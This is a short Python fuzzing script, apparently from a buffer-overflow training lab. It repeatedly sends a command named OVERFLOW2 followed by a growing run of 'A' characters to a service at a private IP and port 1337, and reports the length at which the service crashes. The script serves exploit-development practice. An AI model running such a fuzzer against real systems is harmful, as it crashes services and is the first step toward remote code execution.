#!/usr/bin/env python3
import sys, socket
from time import sleep

buffer = "A" * 100
address = '10.10.211.46' # CHANGE THIS
port = 1337 # CHANGE THIS
vulncommand = 'OVERFLOW2 ' # CHANGE THIS, the vulnerable command that was found in the spiking section would go here
timeout = 5

while True:
        try:
                with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
                        s.settimeout(timeout)
                        s.connect((address,port))
                        s.recv(1024)
                        print("Fuzzing with {} bytes".format(len(buffer)))

                        s.send(bytes(vulncommand + buffer, "latin-1")) # May need to use .encode function to send the payload
                        s.close()
                        sleep(1)
                        buffer = buffer + "A"*100

        except:
                print ("Fuzzing crashed at {} bytes".format(len(buffer)))
                sys.exit()
